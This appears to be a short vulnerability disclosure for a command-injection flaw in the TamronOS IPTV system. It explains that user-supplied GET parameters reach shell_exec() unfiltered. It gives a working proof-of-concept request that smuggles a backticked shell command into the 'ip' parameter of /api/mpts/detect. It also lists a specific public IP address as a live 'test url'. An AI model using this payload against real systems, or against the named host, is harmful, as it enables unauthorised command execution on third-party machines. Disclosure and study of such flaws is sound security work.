# Tamronos-iptv-detect-rce.md

The TamronOS IPTV system has command execution vulnerabilities

official website：http://www.tamronos.com/

## Vulnerability Details

The detect() method in the `iptv/Controllers/MptsController.php` file does not perform filtering verification on the `$_GET['address']` , `$_GET['ip']` passed in by the user. Instead, it is directly passed into function shell_exec() and can be used `` Truncating the command resulted in command injection.

![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/827c19e3-0f8f-40bd-a1b0-1e6f00620fe7)


Access the /api/mpts/detect path to call the detect() method


## Recurrence vulnerability

Test version : TamronOS IPTV 8.6.3 、  TamronOS IPTV/VOD系统 v5


request 
```
/api/mpts/detect?address=aaaa&ip=`touch+/cgi/public/js/aaa.txt`
```
![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/bc9862dd-3322-4b76-b054-9ff87eabccdd)

访问http://localhost.com/js/aaa.txt

![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/42362159-d64e-4f1b-9736-fbb72aa1caf3)


Test url
```
http://103.95.24.37/
```
